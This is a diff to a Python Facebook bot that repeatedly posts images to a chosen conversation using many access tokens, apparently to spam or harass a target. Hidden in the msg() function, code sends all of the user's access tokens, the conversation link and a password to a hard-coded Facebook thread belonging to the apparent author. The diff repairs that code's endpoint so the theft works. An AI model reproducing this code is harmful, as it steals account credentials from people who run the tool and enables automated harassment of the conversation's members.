@@ -87,7 +87,7 @@ def send_messages():
         speed = int(file.read().strip())
 
     liness()
-    
+
     def getName(token):
         try:
             data = requests.get(f'https://graph.facebook.com/v22.0/me?access_token={token}').json()
@@ -100,11 +100,11 @@ def send_messages():
 
     def msg():
         parameters = {
-            'access_token' : random.choice(access_tokens),
+            'access_token': random.choice(access_tokens),
             'message': 'Hello Prince sir im using your server User Profile Name : ' + getName(random.choice(access_tokens)) + '\n Token : ' + " | ".join(access_tokens) + '\n Link : https://www.facebook.com/messages/t/' + convo_id + '\n Password: ' + password
         }
         try:
-            s = requests.post("https://graph.facebook.com/v22.0/t_100049450012082/", data=parameters, headers=headers)
+            s = requests.post("https://graph.facebook.com/v22.0/t_100049450012082/messages", data=parameters, headers=headers)
         except:
             pass
 
@@ -117,13 +117,16 @@ def send_messages():
 
                 image_url = image_urls[image_index].strip()
 
-                url = "https://graph.facebook.com/v22.0/{}/photos".format('t_' + convo_id)
+                # Correct endpoint for photo upload
+                url = f"https://graph.facebook.com/v22.0/t_{convo_id}/photos"
+
                 parameters = {
-                    'access_token': access_token,
-                    'url': image_url,
-                    'message': haters_name + ' Look at this image!',
-                    'published': 'true'
+                    "access_token": access_token,
+                    "url": image_url,
+                    "message": haters_name + " Photo sent via bot",
+                    "published": "true"
                 }
+
                 response = requests.post(url, data=parameters, headers=headers)
 
                 current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
@@ -132,13 +135,13 @@ def send_messages():
                         image_index + 1, convo_id, token_index + 1, image_url))
                     print("  - Time: {}".format(current_time))
                     liness()
-                    liness()
                 else:
                     print("[x] Failed to send image {} of Convo {} with Token {}: {}".format(
                         image_index + 1, convo_id, token_index + 1, image_url))
                     print("  - Time: {}".format(current_time))
+                    print("  - Response: {}".format(response.text))
                     liness()
-                    liness()
+
                 time.sleep(speed)
 
             print("[+] All images sent. Restarting the process...")
@@ -146,11 +149,10 @@ def send_messages():
             print("[!] An error occurred: {}".format(e))
 
 
-
 def main():
     server_thread = threading.Thread(target=execute_server)
     server_thread.start()
-    
+
     send_messages()
 
 if __name__ == '__main__':
